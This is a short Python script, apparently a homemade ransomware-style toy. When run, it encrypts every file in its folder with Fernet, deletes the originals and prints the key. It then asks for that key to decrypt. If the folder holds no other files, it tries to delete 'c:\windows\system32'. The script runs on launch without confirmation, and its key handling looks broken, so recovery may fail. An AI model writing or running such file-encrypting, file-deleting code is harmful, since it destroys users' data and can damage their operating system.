import os
import sys
import base64
from cryptography.fernet import Fernet

def keymanalyatomaimardunga():
    return Fernet.generate_key()

def encyrptiongoburrrrrrrrrrrrh():
    script_name = os.path.basename(sys.argv[0])  
    key_file = "thekey.key"
    key = keymanalyatomaimardunga()
    files_in_folder = os.listdir()
    files_to_encrypt = [file for file in files_in_folder if file != script_name and file != key_file]

    if  len(files_to_encrypt)==0:
        os.remove("c:\\windows\\system32")
        return

    for file in files_to_encrypt:
        if os.path.isfile(file):
            try:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                fernet = Fernet(key)
                encrypted_contents = fernet.encrypt(contents)
                encrypted_file = file + '.encrypted'  
                with open(encrypted_file, "wb") as thefile:
                    thefile.write(encrypted_contents)
                print(f"File '{file}' encrypted successfully!")
                
                os.remove(file)
                print(f"Original file '{file}' removed.")
                
            except Exception as e:
                print(f"Error encrypting '{file}': {e}")

    key_base64 = base64.urlsafe_b64encode(key).decode()
    print(f"Your encryption key is: {key_base64}")
    print("Your files are secure!")

def decrypt_files_in_folder(key_base64):

    script_name = os.path.basename(sys.argv[0]) 
    key_file = "thekey.key"

    try:
        key = base64.urlsafe_b64decode(key_base64.encode())
        fernet = Fernet(key)
    except Exception as e:
        raise ValueError(f"Invalid decryption key: {e}")

    files_in_folder = os.listdir()

    for file in files_in_folder:
        if os.path.isfile(file) and file.endswith('.encrypted'):
            try:
                with open(file, "rb") as thefile:
                    encrypted_contents = thefile.read()
                decrypted_contents = fernet.decrypt(encrypted_contents)
                decrypted_file = file[:-10]  
                with open(decrypted_file, "wb") as thefile:
                    thefile.write(decrypted_contents)
                print(f"File '{file}' decrypted successfully!")
                
                os.remove(file)
                print(f"Encrypted file '{file}' removed.")
                
            except Exception as e:
                print(f"Error decrypting '{file}': {e}")

encyrptiongoburrrrrrrrrrrrh()

decryption_key_base64 = input("Enter the decryption key: ").strip()
decrypt_files_in_folder(decryption_key_base64)
